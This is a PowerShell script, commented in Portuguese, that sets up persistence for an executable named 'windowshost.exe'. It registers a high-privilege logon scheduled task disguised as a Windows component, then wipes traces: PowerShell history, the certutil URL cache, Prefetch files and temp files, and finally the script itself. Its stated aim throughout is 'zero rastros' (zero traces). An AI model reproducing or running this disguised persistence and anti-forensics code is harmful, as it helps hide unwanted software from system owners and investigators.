# ========================================
# CRIAR TAREFA - MÉTODO INLINE
# Zero Rastros
# ========================================

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERRO] Execute como Administrador!" -ForegroundColor Red
    exit 1
}

$PASTA = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$ARQUIVO = "windowshost.exe"
$CAMINHO = Join-Path $PASTA $ARQUIVO
$TAREFA = "Microsoft\Windows\WindowsApps"

Clear-Host
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   CRIAR TAREFA - ZERO RASTROS" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

Write-Host "[1/3] Limpeza completa..." -ForegroundColor Yellow

Get-Process -Name "Rocket","windowshost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-ScheduledTask | Where-Object { $_.TaskName -like "*WindowsApps*" -or $_.TaskName -like "*Rocket*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
certutil -urlcache * delete | Out-Null
Get-ChildItem -Path $env:TEMP -Filter "*CRIAR*","*TAREFA*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*Rocket*","*windowshost*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Write-Host "[OK] Limpeza concluida!" -ForegroundColor Green
Write-Host ""

Write-Host "[2/3] Verificando arquivo..." -ForegroundColor Yellow

if (-not (Test-Path $CAMINHO)) {
    Write-Host "[ERRO] Arquivo nao encontrado: $CAMINHO" -ForegroundColor Red
    Write-Host "Execute o instalador primeiro!" -ForegroundColor Yellow
    pause
    exit 1
}

Write-Host "[OK] Arquivo encontrado!" -ForegroundColor Green
Write-Host ""

Write-Host "[3/3] Criando tarefa..." -ForegroundColor Yellow

try {
    $action = New-ScheduledTaskAction -Execute $CAMINHO
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $trigger.Delay = "PT30S"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false)
    
    Register-ScheduledTask -TaskName $TAREFA -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Componente de Host de Aplicativos do Windows" -Force -ErrorAction Stop | Out-Null
    Write-Host "[OK] Tarefa criada!" -ForegroundColor Green
} catch {
    schtasks /create /tn $TAREFA /tr "`"$CAMINHO`"" /sc onlogon /ru $env:USERNAME /rl HIGHEST /delay 0030 /f | Out-Null
    Write-Host "[OK] Tarefa criada via metodo alternativo!" -ForegroundColor Green
}

Write-Host ""
Write-Host "Limpando rastros finais..." -ForegroundColor Yellow

$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Start-Sleep -Seconds 1
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}

certutil -urlcache * delete | Out-Null
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*CRIAR*","*TAREFA*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   TAREFA CRIADA - ZERO RASTROS!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
pause
